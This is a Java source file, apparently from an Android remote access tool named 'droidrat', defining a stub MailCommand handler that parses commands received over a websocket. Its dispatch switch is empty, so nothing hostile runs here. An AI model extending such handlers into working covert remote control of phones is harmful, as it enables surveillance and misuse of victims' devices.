package com.je_chen.droidrat_je.command;

import com.je_chen.droidrat_je.command.process_super.CommandFather;
import com.je_chen.droidrat_je.command.process_super.CommandProcessInterface;
import com.je_chen.droidrat_je.modules.appintent.mail.SendMail;

import static com.je_chen.droidrat_je.service.command.ProcessCommandService.websocket;

public class MailCommand extends CommandFather implements CommandProcessInterface {

    private SendMail sendMail;

    public MailCommand(){
        sendMail = new SendMail();
    }

    @Override
    public void send(String value) {
        websocket.send(value);
    }

    @Override
    public void processCommand(String command) {
        try {
            String[] rawCommandArray = command.split(" ");
            switch (rawCommandArray[1]) {

            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}